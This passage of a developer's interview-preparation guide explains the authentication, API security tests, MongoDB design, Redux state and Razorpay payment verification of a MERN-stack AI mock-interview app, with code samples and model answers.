    Express->>Express: isAuth middleware<br/>let {token} = req.cookies ✅ exists
    Express->>JWT: jwt.verify(token, JWT_SECRET)
    JWT-->>Express: ❌ THROWS: "jwt expired"
    Express->>Express: catch block catches the error
    Express-->>Browser: 500 {message: "isAuth error: TokenExpiredError"}
    
    Note over Browser: App.jsx catch block runs
    Browser->>Browser: dispatch(setUserData(null))
    Browser->>Browser: UI shows "Login" button<br/>instead of user profile
```

**Your code handles this via the catch block in `isAuth.js`:**
```js
const isAuth = async (req, res, next) => {
    try {
        let { token } = req.cookies
        if (!token) {
            return res.status(400).json({ message: "user does not have a token" })
        }
        const verifyToken = jwt.verify(token, process.env.JWT_SECRET)
        // ↑ If expired, this THROWS TokenExpiredError
        // Code below never runs for expired tokens
        req.userId = verifyToken.userId
        next()
    } catch (error) {
        // Expired token lands here
        return res.status(500).json({ message: `isAuth error ${error}` })
    }
}
```

**And in `App.jsx`, the failed request clears the user:**
```js
try {
    const result = await axios.get(ServerUrl + "/api/user/current-user", { withCredentials: true })
    dispatch(setUserData(result.data))      // Success: user is logged in
} catch (error) {
    dispatch(setUserData(null))             // Failure (expired): clear user state
}
```

**What's missing — a production improvement:**

| Current | Better Approach |
|---|---|
| Token expires → user must re-login with Google | **Refresh token rotation:** Issue a short-lived access token (15 min) + a long-lived refresh token (30 days). When the access token expires, silently get a new one using the refresh token. User stays logged in. |
| Cookie `maxAge` = 7 days (matches JWT) | If JWT expires first, cookie still exists but carries a dead token. Sync them properly. |
| Error code 500 for expired tokens | Should return 401 (Unauthorized) — 500 implies server error |

**Refresh token flow (what you'd add):**
```mermaid
flowchart TD
    A["Access token expires (15 min)"] --> B["Client gets 401 response"]
    B --> C["Axios interceptor catches 401"]
    C --> D["POST /api/auth/refresh-token<br/>Send refresh token cookie"]
    D --> E["Server verifies refresh token"]
    E -->|"Valid"| F["Generate new access token<br/>Set new cookie"]
    F --> G["Retry original request automatically"]
    E -->|"Invalid/Expired"| H["Force re-login"]
```

**🎤 Interview-ready answer:**

> *"When the JWT expires after 7 days, jwt.verify() throws a TokenExpiredError, which the isAuth middleware catches and returns a 500 error. On the frontend, App.jsx's catch block clears the Redux user state, and the UI shows the login button. The user must re-authenticate with Google. For production, I'd implement refresh token rotation — a short-lived access token with a long-lived refresh token, using an Axios interceptor to silently refresh expired tokens without interrupting the user."*

---

### ❓ Q8: How would you secure an API endpoint?

**Answer — your project uses 3 layers of endpoint security:**

```mermaid
flowchart TD
    A["API Request arrives"] --> B["Layer 1: CORS<br/>Only your frontend domain is allowed"]
    B --> C["Layer 2: isAuth Middleware<br/>JWT must be valid and unexpired"]
    C --> D["Layer 3: Business Logic Authorization<br/>User must have credits, own the resource, etc."]
    D --> E["✅ Request processed"]
    
    B -->|"Wrong origin"| F["❌ CORS blocks request"]
    C -->|"No/invalid token"| G["❌ 400/500 — Unauthorized"]
    D -->|"No credits / wrong user"| H["❌ 400/403 — Forbidden"]
```

**Layer 1 — CORS (server/index.js):**
```js
app.use(cors({
    origin: "https://interviewiq-ai-interview-agent-1.onrender.com",
    //     ↑ ONLY this specific domain can make requests
    credentials: true  // Allow cookies
}))
```

**Layer 2 — Authentication (middlewares/isAuth.js):**
```js
// Every protected route has isAuth in the middleware chain:
interviewRouter.post("/resume", isAuth, upload.single("resume"), analyzeResume)
interviewRouter.post("/generate-questions", isAuth, generateQuestion)
interviewRouter.post("/submit-answer", isAuth, submitAnswer)
interviewRouter.post("/finish", isAuth, finishInterview)
interviewRouter.get("/get-interview", isAuth, getMyInterviews)
interviewRouter.get("/report/:id", isAuth, getInterviewReport)
// ↑ ALL 6 interview endpoints are protected by isAuth
```

**Layer 3 — Authorization (controllers):**
```js
// Credit check:
if (user.credits < 50) {
    return res.status(400).json({ message: "Not enough credits" })
}

// Ownership check:
const interviews = await Interview.find({ userId: req.userId })
// ↑ Can only access YOUR interviews
```

**Which endpoints are NOT protected:**
```js
authRouter.post("/google", googleAuth)   // ← Public: how would you log in if login requires login?
authRouter.get("/logout", logOut)         // ← Public: clearing a cookie doesn't need auth
```

**Additional security measures for production:**

```js
// 1. Rate limiting — prevent brute force
import rateLimit from 'express-rate-limit';
const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });
app.use("/api/auth", authLimiter);

// 2. Input validation — prevent injection
import { body, validationResult } from 'express-validator';
authRouter.post("/google",
    body('email').isEmail().normalizeEmail(),
    body('name').trim().escape(),
    googleAuth
);

// 3. Helmet — security headers
import helmet from 'helmet';
app.use(helmet());
```

**🎤 Interview-ready answer:**

> *"I secure endpoints with three layers. First, CORS restricts requests to only my frontend domain. Second, the isAuth middleware verifies the JWT token on every protected route — all 6 interview endpoints and all payment endpoints require it. Third, controllers enforce authorization logic like credit checks and ownership verification. For production, I'd add rate limiting to prevent brute force attacks, input validation with express-validator, and security headers with Helmet."*

---

### ❓ Q9: How would you test an unauthorized request?

**Answer — test at every security layer:**

**Test 1: No cookie at all (unauthenticated)**
```js
// Using curl or Postman:
// POST /api/interview/generate-questions (without any cookie)
// Expected: 400 { message: "user does not have a token" }

// Automated test:
describe('Authentication', () => {
    test('rejects requests without token', async () => {
        const res = await request(app)
            .post('/api/interview/generate-questions')
            .send({ role: "dev", experience: "2 years" });
        // No cookie attached
        
        expect(res.status).toBe(400);
        expect(res.body.message).toContain("does not have a token");
    });
});
```

**Test 2: Invalid/tampered token**
```js
test('rejects tampered token', async () => {
    const res = await request(app)
        .post('/api/interview/generate-questions')
        .set('Cookie', 'token=this.is.a.fake.token')
        .send({ role: "dev" });
    
    expect(res.status).toBe(500);  // jwt.verify throws
    expect(res.body.message).toContain("isAuth error");
});
```

**Test 3: Expired token**
```js
test('rejects expired token', async () => {
    // Generate a token that expires immediately
    const expiredToken = jwt.sign(
        { userId: "672abc" },
        process.env.JWT_SECRET,
        { expiresIn: "0s" }  // Already expired!
    );
    
    const res = await request(app)
        .post('/api/interview/generate-questions')
        .set('Cookie', `token=${expiredToken}`)
        .send({ role: "dev" });
    
    expect(res.status).toBe(500);
    expect(res.body.message).toContain("jwt expired");
});
```

**Test 4: Valid token but unauthorized action**
```js
test('rejects user with insufficient credits', async () => {
    // Create user with 0 credits
    const user = await User.create({ name: "Test", email: "test@test.com", credits: 0 });
    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: "1h" });
    
    const res = await request(app)
        .post('/api/interview/generate-questions')
        .set('Cookie', `token=${token}`)
        .send({ role: "dev", experience: "2 years", mode: "Technical" });
    
    expect(res.status).toBe(400);
    expect(res.body.message).toContain("Not enough credits");
});
```

**Test 5: Cross-user data access (ownership)**
```js
test('user A cannot see user B interviews', async () => {
    // User A creates an interview
    const interviewByA = await Interview.create({ userId: userA._id, ... });
    
    // User B tries to access User A's interviews
    const res = await request(app)
        .get('/api/interview/get-interview')
        .set('Cookie', `token=${tokenB}`);  // User B's token
    
    // Should NOT contain User A's interview
    const interviewIds = res.body.map(i => i._id.toString());
    expect(interviewIds).not.toContain(interviewByA._id.toString());
});
```

```mermaid
flowchart TD
    A["Testing Unauthorized Requests"] --> B["Test 1: No token<br/>→ 400 'no token'"]
    A --> C["Test 2: Fake token<br/>→ 500 'isAuth error'"]
    A --> D["Test 3: Expired token<br/>→ 500 'jwt expired'"]
    A --> E["Test 4: Valid token, no credits<br/>→ 400 'Not enough credits'"]
    A --> F["Test 5: Valid token, wrong user<br/>→ Returns empty / only own data"]
```

**🎤 Interview-ready answer:**

> *"I'd test five scenarios using Supertest: a request with no cookie should get 400, a tampered token should get a verification error, an expired token should trigger TokenExpiredError, a valid token but zero credits should get 400 'Not enough credits', and a valid token should only return that user's own interviews — not another user's data. These tests cover authentication failures at the middleware level and authorization failures at the controller level."*

---

## Section 19: Backend & Database — Interview Q&A (Deep Dive)

> This section covers deeper questions about Node.js, Express, MongoDB, and your system's data layer.

### ❓ Q1: Explain the complete middleware chain for the resume upload endpoint.

**Answer:**
When a request hits `POST /api/interview/resume`, it goes through 4 middleware functions before reaching the controller:

```mermaid
flowchart LR
    A["Request"] --> B["cors()"]
    B --> C["express.json() / cookieParser()"]
    C --> D["isAuth"]
    D --> E["upload.single('resume')"]
    E --> F["analyzeResume (Controller)"]
```

1. **`cors()`**: Checks the `Origin` header. Since frontend and backend are on different subdomains, it validates if the frontend is allowed and accepts credentials (cookies).
2. **`cookieParser()`**: Parses the `Cookie` header into `req.cookies.token`. (Note: `express.json()` is present but skipped because the content type is `multipart/form-data`).
3. **`isAuth`**: Custom middleware. Checks if `req.cookies.token` exists, verifies the JWT using `jsonwebtoken`, and attaches `req.userId` to the request object.
4. **`upload.single('resume')`**: Multer middleware. Reads the stream, enforces the 5MB file size limit, generates a unique filename (timestamp + original name), saves it to disk (`public/`), and attaches file metadata to `req.file`.

**🎤 Interview-ready answer:**
> *"The request passes through four layers: CORS for origin verification, cookie-parser to extract the JWT, the custom isAuth middleware for token validation and attaching the userId, and finally Multer for handling the multipart/form-data upload. Multer saves the file to disk and attaches metadata to req.file, at which point the analyzeResume controller takes over to process the PDF."*

---

### ❓ Q2: Why did you use `Promise.all()` for PDF page extraction?

**Answer:**
PDFs can have multiple pages, and extracting text from them involves asynchronous operations.

```js
const pagePromises = [];
for (let pageNum = 1; pageNum <= pdf.numPages; pageNum++) {
    pagePromises.push(
        pdf.getPage(pageNum).then(async (page) => {
            const content = await page.getTextContent();
            return content.items.map(item => item.str).join(" ");
        })
    );
}
const pagesText = await Promise.all(pagePromises);
```

**Why it matters:**
- **Sequential (`await` inside the loop):** If you have 5 pages, and each takes 200ms, total time = 1000ms.
- **Concurrent (`Promise.all`):** All 5 pages are processed simultaneously. Total time = ~200ms (bound by the slowest page).

Since PDF pages are independent (parsing page 2 doesn't require the text from page 1), they can be parsed in parallel, significantly reducing server response time.

---

### ❓ Q3: How do you handle file cleanup after a PDF upload error?

**Answer:**
Temporary files accumulating on the server can cause disk exhaustion, crashing the application.

```js
try {
    // ... processing
} catch (error) {
    if (req.file && fs.existsSync(req.file.path)) {
        fs.unlinkSync(req.file.path);
    }
    return res.status(500).json({ message: "Error" });
}
```

The `fs.unlinkSync` is present in **both** the happy path (after successful processing) and the `catch` block. `fs.existsSync` prevents crashing if the error occurred *before* the file was fully saved or if it was already deleted.

---

### ❓ Q4: Why embed questions inside the Interview document instead of a separate collection?

**Answer:**
MongoDB is a document database, not relational. 

**Your Schema:**
```js
const interviewSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
    role: String,
    questions: [questionsSchema], // Embedded sub-documents!
    // ...
})
```

**Reasoning:**
1. **Access Pattern:** Questions are *always* accessed in the context of their parent interview. The app never needs to query "show me all questions across all interviews". 
2. **Performance:** Embedding avoids costly `$lookup` (JOIN) operations. A single `Interview.findById()` fetches the interview and all 10 questions in one disk read.
3. **Atomicity:** Updating an interview's status and updating a question's score can happen atomically in one document update.

---

### ❓ Q5: What indexes would you add to MongoDB to optimize this app?

**Answer:**
Currently, Mongoose adds a unique index on `User.email` because of `{ unique: true }`. For scaling, I would add:

1. **`Interview.userId`**: The `getMyInterviews` controller runs `Interview.find({ userId: req.userId })`. Without an index, this is a full collection scan (O(N)). With an index, it's a fast lookup (O(log N)).
2. **`Payment.razorpayOrderId`**: The `verifyPayment` controller looks up payments by this ID. This should be indexed for fast verification.

---

## Section 20: Frontend & React — Interview Q&A (Deep Dive)

> This section covers React architecture, state management, and frontend challenges.

### ❓ Q1: How does the countdown timer work and how do you prevent cheating?

**Answer:**
The timer uses a `setInterval` inside a `useEffect` in the `Timer.jsx` component.

```js
useEffect(() => {
    const timer = setInterval(() => {
        setTimeLeft((prev) => {
            if (prev <= 1) {
                clearInterval(timer);
                return 0;
            }
            return prev - 1;
        });
    }, 1000);
    return () => clearInterval(timer);
}, [currentIndex]);
```

**Preventing cheating (Defense in Depth):**
If a user uses DevTools to pause the JS execution or modify the `timeLeft` state, they can cheat the client-side timer. 
To prevent this, the server *also* validates the time:
```js
// In submitAnswer controller:
if (timeTaken > question.timeLimit) {
    // Force score to 0, return "Time limit exceeded"
}
```
The client UI is just for user experience; the server is the ultimate source of truth.

---

### ❓ Q2: Why Redux Toolkit instead of Context API?

**Answer:**
Redux Toolkit (RTK) is used to manage the global `user` state (name, email, credits).

1. **Performance:** Context API triggers a re-render of *all* consumer components whenever the context value changes. RTK uses fine-grained subscriptions; `useSelector` only re-renders the component if the specific slice of state it's listening to changes.
2. **Boilerplate:** RTK eliminates the traditional Redux boilerplate with `createSlice` (which uses Immer under the hood for immutable updates).
3. **DevTools:** Redux DevTools provides time-travel debugging, which is invaluable for tracking when user credits are deducted or when session state changes.

---

### ❓ Q3: How is the PDF Report generated purely on the frontend?

**Answer:**
The PDF is generated using `jsPDF` and `jspdf-autotable`.

Instead of the server generating the PDF (which consumes server CPU and requires sending a large binary file over the network), the frontend constructs it using the JSON report data it already has in memory.

```js
import jsPDF from "jspdf";
import "jspdf-autotable";

const generatePdf = () => {
    const doc = new jsPDF();
    doc.text(`Interview Report: ${report.role}`, 10, 10);
    
    const tableData = report.questions.map(q => [
        q.question, q.score, q.feedback
    ]);
    
    doc.autoTable({
        head: [['Question', 'Score', 'Feedback']],
        body: tableData
    });
    
    doc.save("Interview_Report.pdf");
};
```
This offloads the computational work to the user's device, saving server costs.

---

### ❓ Q4: What problem does global state management solve?

**Answer:**
In a typical React app, state is passed down through "prop drilling". If the `Navbar` needs to display the user's credit balance, and the `PaymentModal` updates that balance, you would have to lift the state up to their common ancestor (`App.jsx`) and pass it down multiple levels.

Global state management (like Redux) acts as a single centralized "store" outside the component tree. Any component can read from the store (using `useSelector`) and any component can dispatch updates to the store (using `useDispatch`), completely eliminating prop drilling and keeping components decoupled.

---

### ❓ Q5: What is a Reducer, an Action, and the Store?

**Answer:**
- **Store:** The single source of truth. It's a JavaScript object that holds the entire global state of the application. In your app, the store holds the `user` object.
- **Action:** A plain JavaScript object that describes *what* happened. It must have a `type` property and usually carries a `payload` (data). For example, `dispatch(setUserData({ name: "Siddhesh", credits: 150 }))`.
- **Reducer:** A pure function that takes the current state and an action, and returns the *new* state. It dictates *how* the state changes in response to an action. 

With Redux Toolkit (which you used), `createSlice` automatically generates the action creators and reducers for you behind the scenes:
```js
const userSlice = createSlice({
    name: 'user',
    initialState: null,
    reducers: {
        setUserData: (state, action) => {
            return action.payload; // Updates the entire user state
        }
    }
});
```

---

### ❓ Q6: When would you avoid using global state?

**Answer:**
You should avoid global state for data that is only needed by a single component or its immediate children. 
For example:
- Form input values (e.g., typing in the resume upload form).
- UI toggle states (e.g., `isModalOpen` or `isLoading`).
- The `timeLeft` countdown in your `Timer.jsx` component.

These should use local component state (`useState`). Only data that needs to be accessed by many unrelated components (like the authenticated User session, Theme preference, or globally cached API responses) belongs in Redux.

---

## Section 21: Payments (Razorpay) — Interview Q&A (Deep Dive)

> This section covers payment architecture, HMAC, and idempotency.

### ❓ Q1: Explain the Razorpay payment verification flow.

**Answer:**
When a payment succeeds on the frontend, Razorpay returns a `razorpay_order_id`, `razorpay_payment_id`, and `razorpay_signature`.

The server MUST NOT blindly trust this. It verifies the signature using HMAC-SHA256:

```js
import crypto from "crypto";

const body = razorpay_order_id + "|" + razorpay_payment_id;
const expectedSignature = crypto
    .createHmac("sha256", process.env.RAZORPAY_KEY_SECRET)
    .update(body)
    .digest("hex");

if (expectedSignature === razorpay_signature) {
    // Authentic payment!
}
```
**Why:** Only your server and Razorpay know the `KEY_SECRET`. If an attacker tries to spoof a payment request to give themselves free credits, they cannot generate the correct signature without the secret.

---

### ❓ Q2: Why use `$inc` instead of updating credits normally?

**Answer:**
```js
// GOOD: Atomic update
await User.findByIdAndUpdate(userId, { $inc: { credits: 500 } });

// BAD: Read-Modify-Write
const user = await User.findById(userId);
user.credits += 500;
await user.save();
```
**The Race Condition:** If a user rapidly triggers two payments (or a network retry occurs), the "BAD" code might read `credits: 100` twice. Both instances add 500 and save `600`. The user paid for 1000 credits but only got 500. 
`$inc` tells MongoDB to increment the value at the database level, ensuring atomicity.

---

### ❓ Q3: How do you handle Idempotency in payments?

**Answer:**
Idempotency means an operation can be applied multiple times without changing the result beyond the initial application.

In the `verifyPayment` controller:
```js
const payment = await Payment.findOne({ razorpayOrderId });
if (payment.status === "paid") {
    return res.status(200).json({ message: "Already processed" });
}
```
If a user's phone loses network connection right as payment succeeds, the frontend might retry the `/verify-payment` request. The idempotency check ensures we don't give the user credits twice for the same order.

---

### ❓ Q4: Explain the credit system in your app.

**Answer:**
The credit system acts as the virtual currency to monetize API usage.
1. **Creation:** When a new user logs in via Google, the MongoDB `User` schema automatically assigns a default balance of `credits: 100`.
2. **Consumption:** Starting an interview costs 50 credits. The backend checks `if (user.credits < 50)` before calling Gemini. If valid, it deducts 50 using `user.credits -= 50; await user.save()`.
3. **Replenishment:** Users buy plans via Razorpay. Upon successful payment verification, the backend atomically adds credits using MongoDB's `$inc` operator.

---

### ❓ Q5: What is a Webhook, and why use Razorpay webhooks?

**Answer:**
**Webhook:** A webhook is a way for an external service (like Razorpay) to send real-time data to your server via an HTTP POST request when an event occurs, rather than your server constantly polling for updates.

**Why use them?**
Currently, your app relies on the *frontend* receiving the success response from the Razorpay modal and calling `/api/payment/verify-payment`. 
**The vulnerability:** If the user pays, but their browser crashes or loses internet *before* it can call `/verify-payment`, Razorpay has their money, but your database never gets updated. 
**The solution:** By configuring Razorpay Webhooks, Razorpay's servers will directly ping your backend (e.g., `POST /api/webhooks/razorpay`) the moment a payment succeeds, ensuring credits are added even if the user's browser crashes.

---

### ❓ Q6: Why is webhook signature verification necessary?

**Answer:**
If you expose a `POST /api/webhooks/razorpay` endpoint to add credits, *anyone* on the internet could send a POST request to it saying "User Siddhesh just paid $100". 

To prove the request actually came from Razorpay, Razorpay includes a signature header (`x-razorpay-signature`). Your server uses a shared "Webhook Secret" to compute an HMAC-SHA256 hash of the request body. If your computed hash matches the header signature, you know the request is authentically from Razorpay and hasn't been tampered with.

---

### ❓ Q7: What happens if a payment succeeds but your server does not receive the webhook?

**Answer:**
This is why payment systems require **reconciliation**.
1. **Frontend Fallback:** The frontend verify step (which you currently have) acts as the primary immediate confirmation. Webhooks act as a backup.
2. **Cron Jobs:** For high-reliability systems, you would run a nightly cron job that queries the Razorpay API for all "successful" payments in the last 24 hours, compares them against your MongoDB `Payment` collection, and retroactively fulfills any orders that were missed by both the frontend and the webhook.

---

### ❓ Q8: How would you test payment failures?

**Answer:**
Testing edge cases in payments is critical. I would use Razorpay's **Test Mode**:
1. **Declined Cards:** Razorpay provides specific test card numbers that automatically simulate failures (insufficient funds, expired card, bank declined). I'd verify that the frontend displays a proper "Payment Failed" state.
2. **Network Failure Simulation:** I would use Chrome DevTools to throttle the network to "Offline" right after entering the OTP, to ensure the app handles the timeout gracefully and doesn't crash or hang infinitely.
3. **Tampered Verification:** I would use Postman to send a fake request to `/api/payment/verify-payment` with a valid order ID but a modified signature, to ensure the backend throws a 400 Bad Request and doesn't add credits.

---

## Section 22: Challenges, DevOps & Future — Interview Q&A (Deep Dive)

> This section covers system design, scalability, and behavioral reflections.

### ❓ Q1: How did you handle environment variables and dev vs prod environments?

**Answer:**
- **Backend:** `dotenv` loads `.env` locally. On Render, environment variables are set in the dashboard.
- **Frontend:** Vite exposes variables prefixed with `VITE_`.
- **Dynamic URL Resolution:** In `App.jsx`, I determine the API URL dynamically based on Vite's build mode:
  ```js
  export const ServerUrl = import.meta.env.MODE === "development"
    ? "http://localhost:6000"
    : "https://interviewiq-ai-interview-agent.onrender.com";
  ```
This ensures the same codebase can be tested locally and deployed to production without manual code changes.

---

### ❓ Q2: What was the hardest technical challenge you faced?

**Answer:**
**Making AI output reliably parseable.**
Initially, Gemini would return extra conversational text like *"Here is the JSON you requested:"* or wrap the response in Markdown code fences. This caused `JSON.parse()` to throw errors and crash the server.

**The Solution:**
1. Stricter prompt engineering: *"Return ONLY valid JSON. No text before or after."*
2. Aggressive sanitization: `.replace(/```json/g, "").replace(/```/g, "").trim()`
3. Defensive programming: Wrapping all parsing in `try-catch` blocks and verifying the structure before using it.

**The Learning:** You must treat LLM output as untrusted user input. It is non-deterministic and requires multiple layers of validation.

---

### ❓ Q3: How would you scale this application to 100,000 users?

**Answer:**
The current monolithic architecture works for an MVP, but scaling requires separating concerns:

1. **Async AI Queues:** Currently, the server blocks while waiting 3-5 seconds for Gemini. For 100k users, I would implement **BullMQ with Redis**. The frontend submits an answer, the server drops it in a queue and returns immediately, and a background worker processes the AI request. The frontend receives the result via a WebSocket or polling.
2. **Caching:** Cache user profiles and credit balances in Redis to reduce MongoDB load on every protected route.
3. **Database Scaling:** Move MongoDB to a replica set for high availability, and ensure critical fields (`userId`, `razorpayOrderId`) are indexed.
4. **Load Balancing:** Deploy multiple instances of the Express server behind a load balancer. Since JWT authentication is stateless, any server instance can handle any request.

---

### ❓ Q4: If you were to rebuild this project, what would you change?

**Answer:**
1. **Use TypeScript:** Managing the complex JSON structures from the AI (questions, scores, feedback) was error-prone in plain JavaScript. TypeScript interfaces would catch format mismatch errors at compile time.
2. **Add API Rate Limiting:** Implement `express-rate-limit` to prevent users from spamming the AI endpoints and draining API quotas.
3. **WebSockets for real-time AI:** Instead of making the user wait for a loading spinner, I would use WebSockets and Gemini's `streamGenerateContent` API to stream the feedback token-by-token, making it feel like a real-time chat.
4. **File Validation:** Add a `fileFilter` in Multer to verify the MIME type and magic bytes of the uploaded PDF, rather than relying solely on `pdfjs-dist` to fail later in the process.

---

## 🏁 Final Checklist — Before Your Interview

- [ ] Can you draw the full system architecture on a whiteboard?
- [ ] Can you explain what every file in the `server/` folder does?
- [ ] Can you explain JWT authentication without looking at notes?
- [ ] Can you explain why `$inc` is atomic and read-modify-write is not?
- [ ] Can you explain the HMAC payment verification flow?
- [ ] Can you explain `Promise.all` with the PDF parsing example?
- [ ] Can you explain the difference between `httpOnly` cookies and `localStorage`?
- [ ] Can you spot and explain the `http: true` vs `httpOnly: true` bug?
- [ ] Can you explain what Redux solves and how `useSelector`/`useDispatch` work?
- [ ] Can you explain why the AI service is an abstraction layer?
- [ ] Can you trace the lifecycle of a PDF file from upload to deletion?
- [ ] Can you explain all 3 layers of file validation (and what's missing)?
- [ ] Can you explain the 3-stage AI pipeline for resume processing?
- [ ] Can you justify MongoDB over SQL for this specific project?
- [ ] Can you explain the complete middleware chain for the resume upload endpoint?
- [ ] Can you explain temperature, tokens, and context length?
- [ ] Can you explain zero-shot vs few-shot prompting with examples from your project?
- [ ] Can you explain why you'd use `responseMimeType: "application/json"` over prompt-level JSON enforcement?
- [ ] Can you describe the 4-layer defense for AI output validation?
- [ ] Can you explain a 5-layer testing strategy for AI applications?
- [ ] Can you trace the complete login flow from button click to session restore?
- [ ] Can you explain the Firebase + JWT hybrid architecture?
- [ ] Can you explain authentication vs authorization with examples from your code?
- [ ] Can you explain 5 test cases for unauthorized access?

> **Remember:** Interviewers don't expect perfection. They want to see that you **understand** what you built and can **reason** about tradeoffs. If you don't know something, say "I haven't implemented that, but here's how I'd approach it..."

---

*Built to understand, not just to copy. Good luck! 🚀*

